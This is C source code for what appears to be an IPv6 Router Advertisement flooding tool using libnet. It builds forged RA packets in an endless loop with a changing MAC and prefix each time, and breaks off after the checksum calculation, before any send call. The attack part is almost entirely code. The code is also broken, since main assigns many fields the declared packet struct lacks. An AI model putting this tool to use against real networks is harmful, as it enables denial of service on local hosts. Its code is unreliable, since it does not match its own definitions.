
/*
 * RA PACKET STRUCTURE
 */
struct ra_packet
{
  u_int8_t  type;                        /* 134(0x86) */
  u_int8_t  code;                        /* 0 */
  u_int16_t checksum;                    /* 0 */
};

struct adv_addr
{
  union
  {
    u_int8_t   addr8[4];
    u_int32_t  addr32;
  } addr;            /* 128-bit IP6 address */
};

void mac_to_eui64(u_int8_t eui64[], u_int8_t hwaddr[])
{
    eui64[0] = hwaddr[0] ^ 0x02;
    eui64[1] = hwaddr[1];
    eui64[2] = hwaddr[2];
    eui64[3] = 0xff;
    eui64[4] = 0xfe;
    eui64[5] = hwaddr[3];
    eui64[6] = hwaddr[4];
    eui64[7] = hwaddr[5];
}

int main(int argc, char **argv)
{
  /* 
   * Generic
   */
  int i;
  struct adv_addr adv_number;

  /*
   * For RA Packet
   */
  u_int8_t ipdst[16]  = IP_DST;
  u_int8_t hwsrc[6]   = MAC_SRC;
  u_int8_t hwdst[6]   = MAC_DST;
  char adv_prefix[16] = ADV_PREFIX;
  u_int32_t checksum;
  struct ra_packet ra_packet;
  u_int8_t *payload;
  u_int8_t eui64src[8];
  char ifname[16];
  char ch;

  /* 
   * Libnet Value
   */
  char errbuf[LIBNET_ERRBUF_SIZE];
  struct libnet_in6_addr dst_ip;
  struct libnet_in6_addr src_ip;
  libnet_t *l;
  libnet_ptag_t ip_ptag;
  libnet_ptag_t eth_ptag;

  /* Parse the command-line. */
  while ((ch = getopt(argc, argv, "ho:i:b:a:")) != EOF)
    {
      switch ((char) ch) 
	{
	case 'i':
	  strncpy(ifname, optarg, 16);
	  break;
	}
    }

  /*
   * INIT VALUE
   */
  adv_number.addr.addr32 = 0;
   

  /*
   * CREAT RA PACKET
   */
  ra_packet.type = 134;
  ra_packet.code = 0;
  ra_packet.hoplimit = 64;
  ra_packet.lifetime = htons(1800);
  ra_packet.reachabletime = 0;
  ra_packet.retranstime = 0;
  ra_packet.opt_type = 1;
  ra_packet.opt_src_len = 1;
  ra_packet.opt_prefix_type = 3;
  ra_packet.opt_prefix_len = 4;
  ra_packet.opt_prefix_prefixlen = 64;
  ra_packet.opt_prefix_flag = 0xc0;
  ra_packet.opt_prefix_validtime = htonl(0x00278d00);
  ra_packet.opt_prefix_preferredtime = htonl(0x00093a80);

  for( i = 0; i < 6; i++)
    {
      ra_packet.opt_src_mac[i] = hwsrc[i];
    }
  for( i = 0; i < 16; i++)
    {
      ra_packet.opt_prefix_prefix[i] = adv_prefix[i];
    }

  /* src ip addr */ 
    src_ip.__u6_addr.__u6_addr8[0] = 0xfe;
    src_ip.__u6_addr.__u6_addr8[1] = 0x80;
    src_ip.__u6_addr.__u6_addr8[2] = 0x00;
    src_ip.__u6_addr.__u6_addr8[3] = 0x00;
    src_ip.__u6_addr.__u6_addr8[4] = 0x00;
    src_ip.__u6_addr.__u6_addr8[5] = 0x00;
    src_ip.__u6_addr.__u6_addr8[6] = 0x00;
    src_ip.__u6_addr.__u6_addr8[7] = 0x00;

  while(1){ 
    adv_number.addr.addr32++;

    ra_packet.opt_src_mac[2] = adv_number.addr.addr8[3];
    ra_packet.opt_src_mac[3] = adv_number.addr.addr8[2];
    ra_packet.opt_src_mac[4] = adv_number.addr.addr8[1];
    ra_packet.opt_src_mac[5] = adv_number.addr.addr8[0];

    ra_packet.opt_prefix_prefix[2] = adv_number.addr.addr8[3];
    ra_packet.opt_prefix_prefix[3] = adv_number.addr.addr8[2];
    ra_packet.opt_prefix_prefix[4] = adv_number.addr.addr8[1];
    ra_packet.opt_prefix_prefix[5] = adv_number.addr.addr8[0];

    hwsrc[2] = adv_number.addr.addr8[3];
    hwsrc[3] = adv_number.addr.addr8[2];
    hwsrc[4] = adv_number.addr.addr8[1];
    hwsrc[5] = adv_number.addr.addr8[0];


    /* Creat EUI64 from MAC_addr for ipv6 src_ip_addr */
#if 0
    eui64src[0] = hwsrc[0] ^ 0x02;
    eui64src[1] = hwsrc[1];
    eui64src[2] = hwsrc[2];
    eui64src[3] = 0xff;
    eui64src[4] = 0xfe;
    eui64src[5] = hwsrc[3];
    eui64src[6] = hwsrc[4];
    eui64src[7] = hwsrc[5];
#endif
    mac_to_eui64(eui64src, hwsrc);

    /* Creat Link Local Address from EUI64 */
    src_ip.__u6_addr.__u6_addr8[8] = eui64src[0];
    src_ip.__u6_addr.__u6_addr8[9] = eui64src[1];
    src_ip.__u6_addr.__u6_addr8[10] = eui64src[2];
    src_ip.__u6_addr.__u6_addr8[11] = eui64src[3];
    src_ip.__u6_addr.__u6_addr8[12] = eui64src[4];
    src_ip.__u6_addr.__u6_addr8[13] = eui64src[5];
    src_ip.__u6_addr.__u6_addr8[14] = eui64src[6];
    src_ip.__u6_addr.__u6_addr8[15] = eui64src[7];

    /* Set Dest Addr */
    for(i = 0; i < 16; i++)
      {
	dst_ip.__u6_addr.__u6_addr8[i] = ipdst[i];
      }

    /* Calc Pseudo Header Checksum */
    checksum = 0;
    for(i = 0; i < 8; i++) {
      checksum += (u_int16_t)ntohs((u_int16_t)src_ip.__u6_addr.__u6_addr16[i]);
    }
    for(i = 0; i < 8; i++) {
      checksum += (u_int16_t)ntohs((u_int16_t)dst_ip.__u6_addr.__u6_addr16[i]);
    }
    checksum += sizeof(struct ra_packet); /* pesudo-next-type */
    checksum += 58; /* pesudo-next-type */

    /* Calc ICMPv6 Checksum */
    ra_packet.checksum = 0;
    payload = (char *)&ra_packet;
    for(i = 0; i < 23; i++)
      {
	checksum += (u_int32_t)(((u_int32_t)payload[2*i] << 8) + ((u_int32_t)payload[2*i+ 1]));
      }
    checksum = 0xffff - ( (checksum >>16) + (checksum << 16 >> 16) );
    ra_packet.checksum = htons(checksum);

